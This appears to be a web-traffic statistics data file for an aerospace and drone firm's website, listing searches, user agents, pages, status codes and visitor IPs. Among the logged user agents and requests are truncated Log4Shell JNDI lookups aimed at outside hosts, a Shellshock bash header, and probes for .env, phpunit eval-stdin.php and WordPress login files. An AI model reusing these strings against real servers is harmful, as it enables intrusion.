N	RQ	2	3395928894	fiberglass molding techniques
N	RQ	6	3395928894	manufacturing aeronautical prototypes
N	RQ	19	3395928894	louis vuitton luggage outlet
N	RQ	10	3395928894	louis vuitton fashion valley phone
N	RQ	97	3395928894	louis vuitton fashion valley phone number
N	RQ	2	3395928894	texan at 6
N	RQ	18	3395928894	louis vuitton fashion valley ca
N	RQ	14	3195704180	aeronautical engineering drawing
N	RQ	25	2995479466	http://www.gtaeronautics.com/
N	RQ	6	2496890492	texan at6
N	RQ	5	2496890492	bandito pglm
N	RQ	9	2396778135	at 6 texan
N	RQ	20	2296665778	gt aeronautics
N	RQ	1	1697964447	uavs flying over simi valley ca
N	RQ	1	1697964447	gt aeronautics simi valley california
N	RQ	1	1697964447	aeronautical engineer quote
N	RQ	1	1697964447	does aeronautical engineering require drawing?
N	RQ	1	1697964447	how to do gt in engineering drawing
N	RQ	2	1697964447	http://gtaeronautics.com/
N	RQ	1	1697964447	the government college g.t aeronautics
N	RQ	1	1697964447	bme engine
N	RQ	1	1697964447	uas gcs
N	RQ	1	1697964447	http://www.gtaeronautics.com/indnews.html
N	RQ	92	1697964447	semalt.com
N	RQ	1	1697964447	aero iron mentioned nanotechnology hummingbird uav
N	RQ	1	1697964447	basic fiberglass techniques
N	RQ	1	1697964447	http://gtaeronautics.com/indnews.html
N	RQ	1	1697964447	finnemeccia co
N	RQ	2	1697964447	drawing for customer satisfaction
N	RQ	1	1697964447	cheap louis vuitton speedy handbag.com
N	RQ	1	1697964447	at 6
N	RQ	1	1697964447	quotation specialist engineer drawings
N	RQ	1	1697964447	challenge xtreme 111 piece mechanics tool kit
N	RQ	1	1697964447	uav commercial crew stations
N	RQ	1	1697964447	da42 mpp microwave downlink bandwidth
N	RQ	1	1697964447	anti ice de ice qinetiq zephyr
N	RQ	4	1697964447	louis%20vuitton%20fashion%20valley%20phone%20number
N	RQ	1	1697964447	faa uas pilot certification
N	RQ	1	1697964447	any flying crews in gta
N	RQ	1	1697964447	aerospace drawing
N	RQ	1	1697964447	fiber glass molding job
N	RQ	1	1697964447	aircraft design consultant
N	RQ	1	1697964447	www.gt airplane.com
N	RQ	3	1697964447	gt in aeronotics
N	RQ	1	1697964447	tom rullman
N	RQ	1	1697964447	gt aeronautics simi valley ca
N	RQ	1	1697964447	drone base in simi valley
N	RQ	1	1697964447	fiberglass mold making techniques
N	RQ	1	1697964447	rpa instrument qualification faa instrument rating
N	RQ	1	1697964447	extreme bme
N	RQ	1	1697964447	uas faa maintenance
N	RQ	1	1697964447	louis vuitton neverfull
N	RQ	1	1697964447	fiberglass techniques
N	RQ	1	1697964447	aircraft companies in simi valley
N	RQ	1	1697964447	custom fiberglass moldings
N	RQ	11	1697964447	louis vuitton luggage cheap
N	RQ	1	1697964447	anything
N	RQ	1	1697964447	aeronautical engineering sketches
N	RQ	1	1697964447	gtaeronautics.com
N	RQ	1	1697964447	giant scale ziroli at 6
N	RQ	9	1697964447	outlet louis vuitton handbags
N	RQ	1	1697964447	cowling drawing
N	RQ	1	1697964447	mitsubishi zero
N	RQ	1	1697964447	powell wy gt aeronautics
N	RQ	2	1697964447	what is gt in basic engineering drawing
N	RQ	2	1697964447	composite molding
N	RQ	1	1697964447	aeronautics in simi valley and security work
N	RQ	3	1697964447	gt aeronautics llc jobs
N	RQ	1	1697964447	crew flight gta
N	RQ	1	1697964447	110cc engine timing
N	RQ	1	1697964447	aeronautical engineer quotes
N	RQ	2	1697964447	http://www.gtaeronautics.com/compnews.html
N	RQ	4	1697964447	wyoming flight engineers
N	RQ	1	1697964447	a t 6
N	RQ	1	1697964447	gt aeronautics unmanned air
N	RQ	1	1697964447	fia gt composite tooling
N	RQ	1	1697964447	uas pilot certification
N	RQ	1	1697964447	quotes on aeronautical engineers
N	RQ	1	1697964447	payload for diamond northrop twin engie aircraft
N	RQ	7	1697964447	content
N	RQ	1	1697964447	bme 110
N	RQ	1	1697964447	thomas w rullman gt aeronautics
N	RQ	1	1697964447	luggages for sale
N	RQ	2	1697964447	easylifeapp profile
N	RQ	2	1697964447	simi gt
N	RQ	1	1697964447	mq1 design fuel
N	RQ	1	1697964447	airplane as always cia america2009
N	RQ	1	1697964447	eengineer drawing home
N	RQ	1	1697964447	heavy equipment operator jobs
N	RQ	1	1697964447	aero space drone simi valley
N	RQ	1	1697964447	cheap louis vuitton luggage
N	RQ	1	1697964447	2 stroke electric onboard starter
N	RQ	1	1697964447	skyforce observer mk3
N	RQ	1	1697964447	simi valley unmanned aircraft
N	RQ	2	1697964447	granger whitelaw avia
N	RQ	1	1697964447	louis vuitton fashion valley neverfull
N	RQ	1	1697964447	louis vuitton job opportunities
N	RQ	1	1697964447	google.com
N	RQ	1	1697964447	uas operation training method
N	RQ	2	1697964447	wmaid.com explore gtaeronautics.com
N	RQ	1	1697964447	custum muffler 110cc
N	RQ	1	1697964447	glass manufacturing drawings
N	RQ	1	1697964447	electric motors x male uav x sale
N	RQ	1	1697964447	aerospacecompanies in simi valley
N	RQ	1	1697964447	fiberglass molding
N	RQ	2	1697964447	aeronautical technology inc
N	RQ	1	1697964447	taranis ucav
N	RQ	1	1697964447	vegas drone uav show december 2015
N	RQ	1	1697964447	uav companies in simi valley
N	RQ	1	1697964447	unmanned aircraft systems pilot training
N	RQ	2	1697964447	installerex facebook
N	RQ	3	1697964447	texan at6 photos
N	RQ	1	1697964447	aeronautic engineer
N	RQ	30	1697964447	designer handbags outlet sale
N	RQ	1	1697964447	rpas qulificationa traing with faa
N	RQ	1	1697964447	faa uav training
N	RQ	1	1697964447	uav companies simi valley
N	RQ	5	1697964447	louis vuitton purses outlet
N	RQ	1	1697964447	aeronautics
N	RQ	1	1697964447	cheap louis vuitton luggage outlet
N	RQ	1	1697964447	gt aeronautics tomas rullman
N	RQ	1	1697964447	tobbot
N	RQ	1	1697964447	radius tdw efi fuze
N	RQ	8	1697964447	manufacturing equipment store in simi valley
N	RQ	1	1697964447	aeronautic engineer quotes
N	RQ	1	1697964447	onbordstarter
N	RQ	1	1697964447	rotax amphibian unmanned china
N	RQ	1	1697964447	aeronautical engineering quotes
N	RQ	1	1697964447	drawing aircraft engineering
N	RQ	1	1697964447	gt aeronautics careers
N	RQ	1	1697964447	gt aeronautics bandito
N	RQ	1	1697964447	cody wy carbon fiber
N	RQ	7	1597852090	bme extreme
N	RQ	7	1597852090	aerospace engineering drawings
N	RQ	3	798926045	bandito uav
N	RQ	3	798926045	onboard starter
N	RQ	8	698813688	at6 texan
B	*f	-40R	r
B	Rb	38572	4.964	Mozilla/5.0 (compatible; bingbot/2.0;  http://www.bing.com/bingbot.htm)
B	Rb	38064	2.012	ZoominfoBot (zoominfobot at zoominfo dot com)
B	Rb	26400	1.619	Mozilla/5.0 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)
B	Rb	16186	1.280	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
B	Rb	14191	0.932	Sogou web spider/4.0( http://www.sogou.com/docs/help/webmasters.htm#07)
B	Rb	12865	1.815	Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0;  http://www.bing.com/bingbot.htm)
B	Rb	10150	0.949	Mozilla/5.0 (compatible; YandexBot/3.0;  http://yandex.com/bots)
B	Rb	10031	0.907	Mozilla/5.0 (compatible; Baiduspider/2.0;  http://www.baidu.com/search/spider.html)
B	Rb	9998	0.800	Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
B	Rb	8654	0.672	Mozilla/5.0 (compatible; AhrefsBot/7.0;  http://ahrefs.com/robot/)
B	Rb	8061	1.195	Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)
B	Rb	7454	0.548	Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)
B	Rb	7100	0.284	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)
B	Rb	6942	0.248	Mozilla/4.0 (compatible;)
B	Rb	6440	0.412	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
B	Rb	6164	0.059	Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)
B	Rb	6152	0.465	Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
B	Rb	6079	0.302	Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36
B	Rb	5861	0.193	Googlebot-Image/1.0
B	Rb	5848	0.351	Sosospider ( http://help.soso.com/webspider.htm)
B	Rb	5757	1.914	Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1736.0 Safari/537.36
B	Rb	5436	0.399	Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.2) Gecko/20040804 Netscape/7.2 (ax)
B	Rb	5308	0.171	Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)
B	Rb	5198	0.422	Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)
B	Rb	4873	0.159	Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)
B	Rb	4446	0.233	Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)
B	Rb	4368	0.046	Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)
B	Rb	4270	0.588	Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 BingPreview/1.0b
B	Rb	4114	0.491	Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)
B	Rb	3783	0.196	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)
B	Rb	3721	0.128	Mozilla/5.0 (compatible; SeznamBot/3.2;  http://napoveda.seznam.cz/en/seznambot-intro/)
B	Rb	3707	1.006	Mozilla/5.0 (Linux; U; Android 8.1.0; zh-CN; EML-AL00 Build/HUAWEIEML-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 baidu.sogo.uc.UCBrowser/11.9.4.974 UWS/2.13.1.48 Mobile Safari/537.36 AliApp(DingTalk/4.5.11) com.alibaba.android.rimet/10487439 Channel/227200 language/zh-CN
B	Rb	3595	0.368	Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.2; .NET CLR 2.0.50727; .NET CLR)
B	Rb	3594	0.550	PRurl
B	Rb	3493	0.237	Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php? )
B	Rb	3481	0.162	Mozilla/5.0 (X11; Datanyze; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36
B	Rb	3206	0.715	Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322)
B	Rb	3062	0.104	Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322)
B	Rb	3049	0.054	Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET CLR 1.1.4322)
B	Rb	2951	0.304	Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)
B	Rb	696535	71.745	[not listed: 20213]
b	*f	-15Q	s
b	lRQq	1	68	4194854959	148.244	axios
b	lRQq	2	68	4194854959	148.244	axios/0
b	lRQq	1	20	3395928895	120.010	mozilla
b	lRQq	2	1	1	0.000	mozilla/5
b	lRQq	1	9694	4291021674	151.642	Netscape
b	lRQq	2	32	4194854939	148.244	Netscape/8
b	lRQq	2	799	3395928894	120.010	Netscape/0
b	lRQq	2	7	3395928894	120.010	Netscape/5
b	lRQq	2	5529	2396778135	84.701	Netscape/7
b	lRQq	2	2444	1896216350	67.011	Netscape/4
b	lRQq	2	2	1697964447	60.005	Netscape/Nutch-1
b	lRQq	2	73	1697964447	60.005	Netscape/%2F4
b	lRQq	2	1	1697964447	60.005	Netscape/10
b	lRQq	2	1	1697964447	60.005	Netscape/2
b	lRQq	2	9	1697964447	60.005	Netscape/Firefox
b	lRQq	2	1	1697964447	60.005	Netscape/35
b	lRQq	2	3	1697964447	60.005	Netscape/9
b	lRQq	2	335	1597852090	56.467	Netscape/3
b	lRQq	2	25	598701331	21.158	Netscape/6
b	lRQq	1	232	4194854939	148.244	DomainCrawler
b	lRQq	2	83	3395928894	120.010	DomainCrawler/2
b	lRQq	2	15	3395928894	120.010	DomainCrawler/1
b	lRQq	2	134	1697964447	60.005	DomainCrawler/3
b	lRQq	1	16	4194854939	148.244	${${lower:${lower:jndi}}:${lower:rmi}:
b	lRQq	2	4	3395928894	120.010	${${lower:${lower:jndi}}:${lower:rmi}://51
b	lRQq	2	6	1697964447	60.005	${${lower:${lower:jndi}}:${lower:rmi}://188
b	lRQq	2	4	1697964447	60.005	${${lower:${lower:jndi}}:${lower:rmi}://144
b	lRQq	2	2	1697964447	60.005	${${lower:${lower:jndi}}:${lower:rmi}://167
b	lRQq	1	16	4194854939	148.244	Windows-Media-Player
b	lRQq	2	4	1697964447	60.005	Windows-Media-Player/10
b	lRQq	2	1	1697964447	60.005	Windows-Media-Player/9
b	lRQq	2	11	798926045	28.234	Windows-Media-Player/11
b	lRQq	1	27	4194854939	148.244	W3C_Validator
b	lRQq	2	27	4194854939	148.244	W3C_Validator/1
b	lRQq	1	204	4194854939	148.244	Dispatch
b	lRQq	2	204	4194854939	148.244	Dispatch/0
b	lRQq	1	4235	4194854939	148.244	msnbot
b	lRQq	2	2837	3395928894	120.010	msnbot/2
b	lRQq	2	1397	3395928894	120.010	msnbot/1
b	lRQq	1	131	4094742582	144.706	Lynx
b	lRQq	2	131	4094742582	144.706	Lynx/2
b	lRQq	1	2	4094742582	144.706	() { :;}; 
b	lRQq	2	2	4094742582	144.706	() { :;}; /bin/bash
b	lRQq	1	807	3994630225	141.168	Python-urllib
b	lRQq	2	5	3395928894	120.010	Python-urllib/1
b	lRQq	2	74	3295816537	116.472	Python-urllib/3
b	lRQq	2	728	1597852090	56.467	Python-urllib/2
b	lRQq	1	20	3994630225	141.168	com.google.GoogleMobile
b	lRQq	2	2	3395928894	120.010	com.google.GoogleMobile/62
b	lRQq	2	2	3395928894	120.010	com.google.GoogleMobile/67
b	lRQq	2	2	3395928894	120.010	com.google.GoogleMobile/41
b	lRQq	2	1	1697964447	60.005	com.google.GoogleMobile/72
b	lRQq	2	1	1697964447	60.005	com.google.GoogleMobile/65
b	lRQq	2	3	1697964447	60.005	com.google.GoogleMobile/38
b	lRQq	2	3	1697964447	60.005	com.google.GoogleMobile/60
b	lRQq	2	1	1697964447	60.005	com.google.GoogleMobile/61
b	lRQq	2	2	1697964447	60.005	com.google.GoogleMobile/34
b	lRQq	2	3	798926045	28.234	com.google.GoogleMobile/42
b	lRQq	1	259	3994630225	141.168	AppEngine-Google; ( http:
b	lRQq	2	259	3994630225	141.168	AppEngine-Google; ( http://code
b	lRQq	1	117	3894517868	137.630	NSPlayer
b	lRQq	2	5	3395928894	120.010	NSPlayer/12
b	lRQq	2	17	2496890492	88.239	NSPlayer/9
b	lRQq	2	16	2496890492	88.239	NSPlayer/10
b	lRQq	2	78	2396778135	84.701	NSPlayer/11
b	lRQq	2	1	1697964447	60.005	NSPlayer/8
b	lRQq	1	1013311	1840414832	65.039	[not listed: 875]
p	*f	0Q	s
p	lR	1	549135	Windows
p	lR	2	233205	Unknown Windows
p	lR	2	59656	Windows NT
p	lR	2	240139	Windows XP
p	lR	2	2215	Windows 95
p	lR	2	400	Windows CE
p	lR	2	2345	Windows 98
p	lR	2	9372	Windows 2000
p	lR	2	384	Windows 3.1
p	lR	2	1419	Windows ME
p	lR	1	241592	OS unknown
p	lR	1	87007	Known robots
p	lR	1	88896	Macintosh
p	lR	2	84767	Unknown Macintosh
p	lR	2	3132	Macintosh PowerPC
p	lR	2	997	Macintosh 68k
p	lR	1	62464	Unix
p	lR	2	61480	Linux
p	lR	2	905	Other Unix
p	lR	2	22	SunOS
p	lR	2	54	BSD
p	lR	2	3	HP-UX
p	lR	1	29	OS/2
p	lR	1	16	WebTV
p	lR	1	13	BeOS
p	lR	1	7	Amiga
i	*f	0R	s
i	lRc	1	598757	21.575	[root directory]
i	lRc	1	280149	73.129	/images/
i	lRc	1	103798	0.084	/js/
i	lRc	1	54208	0.075	/css/
i	lRc	1	175	5.137	/uploads/
i	lRc	1	865	0.000	/videos/
i	lRc	1	541	0.000	/client/
i	lRc	1	1	0.000	/cgi-bin/
i	lRc	1	180	0.000	/dev/
i	lRc	2	23	0.000	/dev/css/
i	lRc	2	44	0.000	/dev/js/
i	lRc	2	59	0.000	/dev/images/
i	lRc	1	1	0.000	/secure/
i	lRc	1	74	0.000	/stats/
r	*f	0.050000%S	s
r	lRSc	1	27881	24	1.228	/aboutus.html
r	lRSc	1	19005	22	0.736	/contactus.html
r	lRSc	1	14296	20	1.525	/indevents.html
r	lRSc	1	23993	20	14.744	/compnews.html
r	lRSc	1	17513	18	1.302	/cct&m.html
r	lRSc	1	1394	17	0.867	/gt100hl+rpas.html
r	lRSc	1	22469	17	1.299	/uasfc.html
r	lRSc	1	9276	17	0.967	/sru.html
r	lRSc	1	27480	15	44.119	/indnews.html
r	lRSc	2	141	0	0.000	/indnews.html?referer=www.clickfind.com.au/wp-login.php
r	lRSc	2	1	0	0.000	/indnews.html?referer=top1.co.pl
r	lRSc	2	1	0	0.000	/indnews.html?referer=www.clickfind.com.au//wp-content/themes/busybee/thumb.php?src=http://blogger.com.opontodaarte.com.br/java.php
r	lRSc	1	17743	15	0.740	/cfmt.html
r	lRSc	1	6061	15	0.829	/gt1500+rpas.html
r	lRSc	1	14964	14	0.893	/links.html
r	lRSc	1	13149	14	0.912	/faq.html
r	lRSc	1	5696	13	0.623	/gt50t+rpas.html
r	lRSc	1	6013	12	0.572	/gt380+rpas.html
r	lRSc	1	18356	12	0.916	/consultinga.html
r	lRSc	1	14331	12	0.384	/pna.html
r	lRSc	1	9955	12	0.763	/rd.html
r	lRSc	1	15871	10	0.320	/employment.html
r	lRSc	1	31	5	5.157	/uploads/idrone-pressrelease-powell-version220119.pdf
r	lRSc	1	21	5	1.013	/uploads/big+horn+basin+drone+festival+event+schedule.pdf
r	lRSc	1	29	5	7.441	/uploads/bighornbasindronefestivalflyer-v2-220110.pdf
r	lRSc	1	18	5	7.121	/uploads/2022wydronefestflyer+rev2.pdf
r	lRSc	1	21	3	5.464	/uploads/droneexpojan2022+(1).pdf
r	lRSc	1	3814	1	0.063	/banditomav.html
r	lRSc	1	1	0	0.000	/client/bandito timeline2007.html
r	lRSc	1	2	0	0.000	/client/bandit+timeline2004.html
r	lRSc	1	1	0	0.000	/stats/quick.html
r	lRSc	1	1	0	0.000	/404.htm
r	lRSc	1	12	0	0.000	/client/gta010707002.html
r	lRSc	1	72	0	0.000	/client/bandito+development.html
r	lRSc	1	135	0	0.000	/client/welcome.html
r	lRSc	1	3	0	0.000	/client/gta021305001.html
r	lRSc	1	1	0	0.000	/stats/browserrep.html
r	lRSc	1	741	0	0.000	/gt50t rpas.html
r	lRSc	1	5	0	0.000	/client/gta012405001.html
r	lRSc	1	2	0	0.000	/dev/contactus.html
r	lRSc	1	4	0	0.000	/stats/general.html
r	lRSc	1	1	0	0.000	/stats/dailyrep.html
r	lRSc	1	1	0	0.000	/dev/aboutus.html
r	lRSc	1	18	0	0.000	/client/tacamo+development.html
r	lRSc	1	1	0	0.000	/client/bandit development.html
r	lRSc	1	17	0	0.000	/client/bandit+timeline2008.html
r	lRSc	1	1	0	0.000	/client/bandito+timeline2005.html
r	lRSc	1	23	0	0.000	/client/projectbids.html
r	lRSc	1	1	0	0.000	/stats/host.html
r	lRSc	1	11	0	0.000	/client/rq2+outlaw.html
r	lRSc	1	1	0	0.000	/client/bandit timeline2008.html
r	lRSc	1	20	0	0.000	/client/clientpna.html
r	lRSc	1	15	0	0.000	/client/bandit.html
r	lRSc	1	2	0	0.000	/stats/default.asp
r	lRSc	1	21	0	0.000	/index.htm
r	lRSc	1	1	0	0.000	/cgi-bin/testms.pl
r	lRSc	1	979	0	0.000	/gtamt.html
r	lRSc	1	14	0	0.000	/client/rq1+bandit.html
r	lRSc	1	2253	0	0.000	/gt1500 rpas.html
r	lRSc	1	6	0	0.000	/client/gta021305002.html
r	lRSc	1	4	0	0.000	/client/gta121004001.html
r	lRSc	1	24	0	0.000	/client/tacamo.html
r	lRSc	1	30	0	0.000	/client/mgqgcyat.asp
r	lRSc	1	1	0	0.000	/dev/client.cgi
r	lRSc	1	18702	0	0.000	/default.asp
r	lRSc	1	1666	0	0.000	/gt380 rpas.html
r	lRSc	1	1	0	0.000	/client/bandito+timeline2006.html
r	lRSc	1	16	0	0.000	/client/rq3+bandito.html
r	lRSc	1	1	0	0.000	/dev/uasfc.html
r	lRSc	1	229	0	0.000	/client.cgi
r	lRSc	1	71	0	0.000	/client/bandit+development.html
r	lRSc	1	2	0	0.000	/client/bandito development.html
r	lRSc	1	2	0	0.000	/stats/yearly.html
r	lRSc	1	2	0	0.000	/stats/domain.html
r	lRSc	1	1	0	0.000	/stats/monthly.html
r	lRSc	1	2	0	0.000	/stats/weekly.html
r	lRSc	1	8	0	0.000	/client/gta010707001.html
r	lRSc	1	4124	0	0.000	/uavengines.html
r	lRSc	1	3749	0	0.000	/bidspridpass.html
r	lRSc	1	6356	0	0.000	/pridpass.html
r	lRSc	1	12	0	0.000	/client/bandito.html
r	lRSc	1	3928	0	0.000	/gtatexan.html
r	lRSc	1	1	0	0.000	/dev/pna.html
r	lRSc	1	1	0	0.000	/client/tacamo development.html
r	lRSc	1	4	0	0.000	/stats/index.htm
r	lRSc	1	4	0	0.000	/stats/nav.html
r	lRSc	1	1	0	0.000	/stats/quarterly.html
r	lRSc	1	3709	0	0.000	/bandituas.html
r	lRSc	1	2	0	0.000	/stats/directory.html
r	lRSc	1	2	0	0.000	/stats/organisation.html
r	lRSc	1	8	0	0.000	/client/bandito+timeline2007.html
r	lRSc	1	7	0	0.000	/client/bandit+timeline2007.html
r	lRSc	1	1	0	0.000	/dev/pridpass.html
t	*f	0.100000%B	b
t	lRb	1	220677	36.258	.jpg  [JPEG graphics]
t	lRb	1	317306	34.068	.html [Hypertext Markup Language]
t	lRb	1	247169	21.376	[directories]
t	lRb	1	778	2.900	.wmv
t	lRb	1	87	2.847	.mpg  [MPEG movie]
t	lRb	1	18734	1.225	.asp  [Active Server REQUESTS]
t	lRb	1	59555	0.380	.gif  [GIF graphics]
t	lRb	1	103842	0.316	.js  [JavaScript code]
t	lRb	1	54223	0.279	.css  [Cascading Style Sheets]
t	lRb	1	55	0.189	.mp4
t	lRb	1	16323	0.162	[not listed: 7]
z	*FR	2009	06	30	04	42
z	*LR	2022	05	06	23	56
z	ScR	111	0.000	78909	0
z	ScR	0	0.000	0	1b-  10b
z	ScR	0	0.000	0	11b- 100b
z	ScR	55	0.006	81643	101b-  1kb
z	ScR	444	1.354	474569	1kb- 10kb
z	ScR	266	4.881	332212	10kb-100kb
z	ScR	477	57.741	69345	100kb-  1Mb
z	ScR	32	36.018	2028	1Mb- 10Mb
z	ScR	0	0.000	43	10Mb-100Mb
c	*FR	2014	03	02	13	52
c	*LR	2022	05	06	23	56
c	*f	0R	a
c	R	955637	200 OK
c	R	6989	206 Partial content
c	R	110	301 Document moved permanently
c	R	77	302 Document found elsewhere
c	R	76123	304 Not modified since last retrieval
c	R	755	400 Bad request
c	R	207	401 Authentication required
c	R	202	403 Access forbidden
c	R	418073	404 Document not found
c	R	1050	405 Method not allowed
c	R	477	406 Document not acceptable to client
c	R	89	416 Requested range not valid
c	R	617	500 Internal server error
c	R	128	501 Request type not supported
I	*FR	2007	12	11	00	52
I	*LR	2022	05	06	23	26
I	*f	-30S	s
I	lRS	1	102323	120	/robots.txt
I	lRS	1	823	18	/.env
I	lRS	1	1174	15	/
I	lRS	1	3297	14	/ads.txt
I	lRS	1	274	14	/vendor/phpunit/phpunit/src/util/php/eval-stdin.php
I	lRS	1	2131	13	/xmlrpc.php
I	lRS	1	6351	10	/wp-login.php
I	lRS	1	829	6	/videos/bandito+004+flt+8+clip+092508.wmv
I	lRS	1	862	4	/sitemap.xml
I	lRS	1	139	4	/mobile-app
I	lRS	1	698	4	/wordpress/
I	lRS	1	11	4	/sitemap
I	lRS	1	141	3	/android
I	lRS	1	136	3	/ios
I	lRS	1	1739	3	/plus/mytag_js.php
I	lRS	1	162	3	/data/admin/ver.txt
I	lRS	1	136	3	/downloads
I	lRS	1	24	3	/uploads/userup/
I	lRS	1	32	3	/sitemap.txt
I	lRS	1	432	2	/wp1/wp-includes/wlwmanifest.xml
I	lRS	1	416	2	/shop/wp-includes/wlwmanifest.xml
I	lRS	1	315	2	/2019/wp-includes/wlwmanifest.xml
I	lRS	1	589	2	/wp-includes/wlwmanifest.xml
I	lRS	1	178	2	/mobile
I	lRS	1	17497	2	/]louis
I	lRS	1	436	2	/web/wp-includes/wlwmanifest.xml
I	lRS	1	430	2	/sito/wp-includes/wlwmanifest.xml
I	lRS	1	857	2	/">louis
I	lRS	1	576	2	/blog/wp-includes/wlwmanifest.xml
I	lRS	1	432	2	/website/wp-includes/wlwmanifest.xml
I	lRS	1	278152	78	[not listed: 22514]
L	*FR	2007	12	11	00	52
L	*LR	2022	05	06	23	26
L	*f	-20S	s
L	RS	63	36	210.16.102.195
L	RS	18	18	182.16.248.210
L	RS	18	18	164.92.113.127
L	RS	17	17	51.75.232.246
L	RS	1653	11	216.244.66.229
L	RS	18	9	192.253.238.66
L	RS	233	9	157.90.182.26
L	RS	53	7	66.249.64.66
L	RS	6	6	34.216.142.175
L	RS	163	6	66.249.64.94
L	RS	5	5	121.204.132.153
L	RS	5	5	62.197.136.102
L	RS	5	5	35.205.135.47
L	RS	28	5	40.77.167.97
L	RS	44	4	66.249.64.68
L	RS	4	4	34.74.124.201
L	RS	12	4	20.115.128.142
L	RS	4	4	211.205.155.42
L	RS	133	4	108.59.8.80
L	RS	48	3	194.38.20.161
L	RS	419068	167	[not listed: 76922]
K	*FR	2013	12	22	04	20
K	*LR	2022	05	05	19	55
K	*f	-30S	s
K	lRS	1	921	4	http://gtaeronautics.com/
K	lRS	1	185	2	http://www.gtaeronautics.com/BANDITOMAV.html
K	lRS	1	20784	2	http://www.gtaeronautics.com/
K	lRS	1	3	1	http://www.gtaeronautics.com/m/d/txt/test.txt
K	lRS	1	29926	0	[not listed: 4903]
E	*FR	2008	01	06	10	12
E	*LR	2022	04	19	22	19
E	*f	-30S	s
E	lSR	1	0	187	[not listed: 6]
l	*FR	2008	01	06	10	12
l	*LR	2022	04	19	22	19
l	*f	-20S	s
l	SR	0	187	[not listed: 104]
v	*f	-20B	b
v	Rb	381334	53.082	64.41.87.40
v	Rb	657415	46.918	66.113.131.59
R	*FR	2008	01	06	10	12
R	*LR	2022	04	19	22	19
R	*f	-20R	r
R	R	178	66.113.131.59
R	R	9	64.41.87.40
M	*FR	2007	12	11	00	52
M	*LR	2022	05	06	23	26
M	*f	-20R	r
M	R	302606	66.113.131.59
M	R	118992	64.41.87.40
J	*FR	2007	12	11	00	53
J	*LR	2017	03	17	18	30
J	*f	-20R	r
J	R	9	gtaeronautics
J	R	5	lorrigkj
J	R	1	rullma2063
J	R	1	administrator
J	R	1	satish
J	R	1	nnnnn
P	*FR	2022	03	10	19	59
P	*LR	2022	05	06	23	56
P	R	56	0
P	R	0	<= 0.01
P	R	696	0.01-0.02
P	R	31574	0.02-0.05
P	R	70867	0.05-0.1 
P	R	87704	0.1 -0.2 
P	R	89326	0.2 -0.5 
P	R	44439	0.5 -1   
P	R	25395	1-  2 
P	R	11316	2-  5 
P	R	6896	5- 10 
P	R	2975	10- 20 
P	R	9020	20- 60 
P	R	866	60-120 
P	R	179	120-300 
